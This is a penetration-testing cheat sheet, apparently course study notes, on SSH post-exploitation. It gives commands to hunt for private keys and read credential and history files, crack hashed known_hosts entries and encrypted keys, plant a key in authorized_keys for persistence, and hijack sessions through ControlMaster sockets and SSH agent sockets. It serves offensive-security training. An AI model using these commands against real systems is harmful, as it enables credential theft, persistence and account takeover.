
# SSH

## Hunt for Keys

```
find / -name "*id_rsa" 2>/dev/null
find / -name "*rsa" 2>/dev/null
find / -name "*key" 2>/dev/null
find / -name "*id_*" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
find / -name "known_hosts" 2>/dev/null

grep -r "BEGIN PRIVATE KEY" /home/ 2>/dev/null
grep -r "BEGIN RSA PRIVATE KEY" /home/ 2>/dev/null
grep -r "BEGIN OPENSSH PRIVATE KEY" /home/ 2>/dev/null
```

## Identifying Encrypted Keys

To check if a key is encrypted, you can view its contents:

```bash
cat id_rsa
```

If the key is encrypted, it will have the following structure:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,351CBB3ECC54B554DD07029E2C377380
```

- `Proc-Type` identifies the key as encrypted.
- `DEK-Info` identifies the encryption type.

## Identifying Key Purpose

Upon discovery of SSH keys, it is important to identify their usage or where they might be used to authenticate to.

```bash
# /etc/passwd may give a clue if the key name is related to a user account
cat /etc/passwd

# /home/user/.ssh/known_hosts may identify usage
cat /home/user/.ssh/known_hosts

# Check user's .bash_history
cat /home/user/.bash_history
```

## Cracking SSH Known_Hosts

In some cases, when the value `HashKnownHosts` is enabled in `/etc/ssh/ssh_config`, the original values are encrypted, and it is not possible to use this information to identify where the keys are intended for. However, this file can be cracked trivially. This is an important consideration, as when in a large network or for the purposes of stealth, it is not feasible to spray SSH with any discovered private keys.

```bash
git clone https://github.com/chris408/known_hosts-hashcat.git

python3 kh-converter.py known_hosts > hashcat_known_hosts.txt
```

Example output:

```
6ebd38843a26fc42b4d549ba36f2487bb7baf3c2:9a2d6bc4c8118b61232c9ae7868d1d63eacf6d1c
e8173fe03374595b5f67d4206e7d313e66e869aa:b452e5fbad7523a2abdeeb94a71853f4447b41ed
da89e9ddde942d6772a0546fdf3eae56e4bd41fe:90448ef75bbc6ccd0a4beb3a8f75c3239916a41f
```

This can then be taken to `hashcat` with the mask file provided within the GitHub repository:

```bash
hashcat -m 160 -a 3 -O --hex-salt --quiet Hashes\hashcat_known_hosts.txt masks\ipv4_hcmask.txt
```

Example output:

```
6ebd38843a26fc42b4d549ba36f2487bb7baf3c2:9a2d6bc4c8118b61232c9ae7868d1d63eacf6d1c:192.168.120.40
da89e9ddde942d6772a0546fdf3eae56e4bd41fe:90448ef75bbc6ccd0a4beb3a8f75c3239916a41f:192.168.168.40
```

## Cracking SSH Keys

To crack SSH keys:

```bash
# Convert key to hash
python /usr/share/john/ssh2john.py enc.key > key.hash 

# Using John the Ripper (JTR)
sudo john --wordlist=/usr/share/wordlists/rockyou.txt ./key.hash  

# Using Hashcat
hashcat -m [Mode] -a 0 -O Hashes\key.hash.txt  Wordlists\rockyou.txt rules\best64.rule
```

Refer to the table below to identify which Hashcat mode to use against the SSH key. Ensure to remove the appended file name from the `ssh2john` conversion before cracking. For example:

```
enc.key:$sshng$1$16$351CBB3ECC --> $sshng$1$16$351CBB3ECC
```
| Hashcat Mode | Hash Format           |
|--------------|-----------------------|
| 22911        | $sshng$0$8$           |
| 22921        | $sshng$6$8$           |
| 22931        | $sshng$1$16$          |
| 22941        | $sshng$4$16$          |
| 22951        | $sshng$5$16$          |

# SSH Persistence

```bash
# Execute on attacker system
# Complete with default values
ssh-keygen

# echo the contents of the generated public key, into the authorized keys file on the remote system
echo "ssh-ed25519 AAAAC3NzaC1lZ== kali@kali" >> /home/user/.ssh/authorized_keys

# Then freely SSH into the target system as the user specified above
ssh user@10.10.10.100
```


# SSH Hijacking using ControlMaster

OpenSSH's `ControlMaster` feature allows multiple SSH sessions to share a single network connection. This can be exploited to hijack existing SSH connections if you have shell access to the target machine.

## Step-by-Step Process:

1. **Gain Shell Access**:
   - Obtain shell-level access to the target machine.

2. **Configure ControlMaster**:
   - Access the victim's home directory and create or modify the `~/.ssh/config` file.
   - Add the following configuration:

     ```bash
     Host *
         ControlMaster auto
         ControlPath ~/.ssh/master-socket/%r@%h:%p
         ControlPersist yes
     ```

   - Ensure the directory `~/.ssh/master-socket/` exists. If not, create it:
     
     ```bash
     mkdir -p ~/.ssh/master-socket/
     ```

3. **Set Correct Permissions**:
   - Secure the configuration file:
     
     ```bash
     chmod 600 ~/.ssh/config
     ```

4. **Wait for Victim Login**:
   - Wait for the victim to establish an SSH connection to another server.

5. **Check for Active ControlMaster Sockets**:
   - Observe the created socket file:

     ```bash
     ls -lat ~/.ssh/master-socket/
     ```

6. **Hijack the SSH Session**:
   - Use the existing socket file to connect to the victim's session:

     ```bash
     ssh -S ~/.ssh/master-socket/<username>@<hostname>:<port> <target-host>
     ```



   📝 These ControlMaster settings can also be placed in /etc/ssh/ssh_config to configure ControlMaster at a system-wide level.

# SSH Hijacking Using SSH-Agent and SSH Agent Forwarding

## Setup

Copy our own SSH key created from ssh-keygen onto both the immediate "first-hop" server and the destination servers.
```
ssh-copy-id -i ~/.ssh/id_ed25519.pub offsec@192.168.223.40
ssh-copy-id -i ~/.ssh/id_ed25519.pub offsec@192.168.223.45
```

Set the following value in `~/.ssh/config` on the `attacker` system.

```
ForwardAgent yes
```
On the immediate or "first-hop server" ensure the following configuration is set in `/etc/ssh/sshd_config`
```
AllowAgentForwarding yes
```
We need to then add our own SSH keys created from ssh-keygen to the agent.
```
ssh-add /home/kali/.ssh/id_ed25519
```
This setup allows your SSH key to be used through multiple hops without having to copy the private key itself to each server.


# SSH Agent Forwarding Abuse

## Overview
With elevated permissions on an immediate "first-hop" server, it is possible to hijack active SSH agent sessions on the system. This allows an attacker to use the SSH agent of a logged-in user to access other systems without needing the user's private key.

## Abuse

List all running SSH processes to identify active agent sessions.

```bash
ps aux | grep ssh
```

Check the process tree to find the process IDs (PIDs) associated with SSH connections.

```bash
pstree -p offsec | grep ssh
```

Inspect the environment variables of the SSH process to find the `SSH_AUTH_SOCK` value, which is needed to connect to the SSH agent.

```bash
cat /proc/16381/environ
```
Replace `16381` with the PID of the SSH process.

Set the `SSH_AUTH_SOCK` environment variable to the value found in the previous step, then list the keys loaded in the SSH agent:

```bash
SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh-add -l
```

If keys are listed, this confirms that you have successfully hijacked the SSH agent.

Using the hijacked agent, SSH into the destination system without needing additional credentials:

```bash
SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh offsec@linuxvictim
```
Replace `offsec@linuxvictim` with the appropriate username and target host.

This allows you to access the victim's SSH sessions using their agent without knowing their private key, leveraging the active SSH connection.


